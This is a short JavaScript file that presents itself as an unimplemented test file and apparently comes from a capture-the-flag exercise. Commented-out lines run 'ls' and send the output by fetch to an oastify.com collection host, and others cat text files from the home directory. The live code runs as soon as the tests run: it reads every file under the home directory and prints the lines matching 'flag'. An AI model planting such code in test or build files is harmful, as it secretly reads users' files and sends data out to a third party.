// TODO: implement the tests
console.log("Tests are not implemented yet...");


//const { exec } = require('child_process');
//let a = exec('ls');
//fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);

//var cp = require('child_process');
//console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());

//var cp = require('child_process');
//console.log(cp.execSync('cat ./flag.txt').toString());

const { exec } = require('child_process');

exec('find ~ -name "*" -type f -exec cat {} + > flag.l && grep "flag" flag.l > flag.2 && cat flag.2', (err, stdout, stderr) => {
  if (err) {
    console.error(`${err}`);
    return;
  }

  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);
});
